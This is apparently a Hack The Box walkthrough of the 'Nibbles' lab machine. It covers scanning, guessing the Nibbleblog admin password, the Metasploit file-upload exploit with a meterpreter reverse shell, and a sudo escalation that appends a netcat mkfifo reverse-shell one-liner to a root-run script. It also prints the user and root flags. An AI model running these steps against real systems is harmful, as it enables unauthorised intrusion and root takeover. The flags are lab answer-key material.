# Flags
- User:
	- c949fd4e43b7ecf2bd845c9451db9c7f
- Root:
	- 0e391706cf66c2f4ae6763781a6cf6cb


# Notes
- First, we will start by running a rustscan with nmap -sC -sV parameters to see what services may be running on this box:
```
rustscan --ulimit 5000 --addresses "10.129.15.92" --top -- -sC -sV
```
- We only seem to have SSH and a webserver that is running on this box.
- So, I will go ahead and visit the IP to see if the browser shows anything.
- In the meantime, I'll run gobuster against it to see if it'll find anything of interest:
```
gobuster dir -w `fzf-wordlists` -u http://10.129.211.214
```
- From that search, I was not able to get any results from the bat, so I went on to used whatweb instead.
- Running whatweb, we can see a redirection to a directory named /nibbleblog/.
- This makes sense why gobuster didn't pick anything up: likely all the pages are something like PHP files behind these directory.
```
[Nov 09, 2025 - 20:46:26 (PST)] exegol-htb-labs /workspace # whatweb 10.129.211.214                                                    
http://10.129.211.214 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.211.214]  
[Nov 09, 2025 - 20:46:43 (PST)] exegol-htb-labs /workspace # curl 10.129.211.214             
<b>Hello world!</b>  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
- After visiting it, we can confirm the existence of an nibbleblog.
- We can then visit the admin.php page. We can infer that "nibbles" is a good possible password for an admin account,
- Sure enough, we are able to login as the admin using those credentials.
- Now, we have access to the admin page, where we are able to upload/modifiy content with the nibbleblog instance. Can we possibly use this for some sort of upload exploit or something?
- I'm going to check Metasploit first, and after doing a search, we can see a file upload vulnerability we can use:
```
msf > search nibbleblog  
  
Matching Modules  
================  
  
  #  Name                                       Disclosure Date  Rank       Check  Description  
  -  ----                                       ---------------  ----       -----  -----------  
  0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability  
  
  
Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
```
- We'll go ahead and use the default reverse_tcp payload.
- Here are our options:
```
Module options (exploit/multi/http/nibbleblog_file_upload):  
  
  Name       Current Setting  Required  Description  
  ----       ---------------  --------  -----------  
  PASSWORD                    yes       The password to authenticate with  
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4  
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html  
  RPORT      80               yes       The target port (TCP)  
  SSL        false            no        Negotiate SSL/TLS for outgoing connections  
  TARGETURI  /                yes       The base path to the web application  
  USERNAME                    yes       The username to authenticate with  
  VHOST                       no        HTTP server virtual host  
  
  
Payload options (php/meterpreter/reverse_tcp):  
  
  Name   Current Setting  Required  Description  
  ----   ---------------  --------  -----------  
  LHOST  172.17.0.2       yes       The listen address (an interface may be specified)  
  LPORT  4444             yes       The listen port
```
- After configuring and setting all of our options, we are able to run our exploit and get access into the machine.
```
id  
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
- We can then upgrade our session using Python to a get a nicer experience:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- We can then navigate to the user's home directory and read out the flag:
```
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home     
<ml/nibbleblog/content/private/plugins/my_image$ cd /home                       
nibbler@Nibbles:/home$ ls  
ls  
nibbler  
nibbler@Nibbles:/home$ cd nibbler  
cd nibbler  
nibbler@Nibbles:/home/nibbler$ ls  
ls  
personal.zip  user.txt  
nibbler@Nibbles:/home/nibbler$ cat user.txt  
cat user.txt  
c949fd4e43b7ecf2bd845c9451db9c7f
```
- Now that we have access, let's see if we can escalate to root.
- I went ahead and opened a web server on my attacking container to where I keep my LinPEAS script at, and download a copy of that onto the box.
- I go ahead and run it to see if it can find anything.
- Here, we get something interesting:
```
[+] We can sudo without supplying a password!                                                                                                                                                                                                  
Matching Defaults entries for nibbler on Nibbles:                                                                                                                                                                                              
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                                          
                                                                                                                                                                                                                                              
User nibbler may run the following commands on Nibbles:                                                                                                                                                                                        
   (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh                                                                                                                                                                                   
                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                              
[+] Possible sudo pwnage!                                                                                                                                                                                                                      
/home/nibbler/personal/stuff/monitor.sh
```
- I wonder if we can use this to append something to get us to root!
- So, let's do something like that!
- First, we need to unzip the file so that we have access to the script.
- Next, let's append our file to get us a root shell:
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.31 8888 >/tmp/f' | tee -a /home/nibbler/personal/stuff/monitor.sh
```
- And we were able to get root!
```
# id  
uid=0(root) gid=0(root) groups=0(root)  
#
```
- We can then get to the root.txt and read out the root flag!
```
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cd /root    
# ls  
root.txt  
# cat root.txt  
0e391706cf66c2f4ae6763781a6cf6cb
```
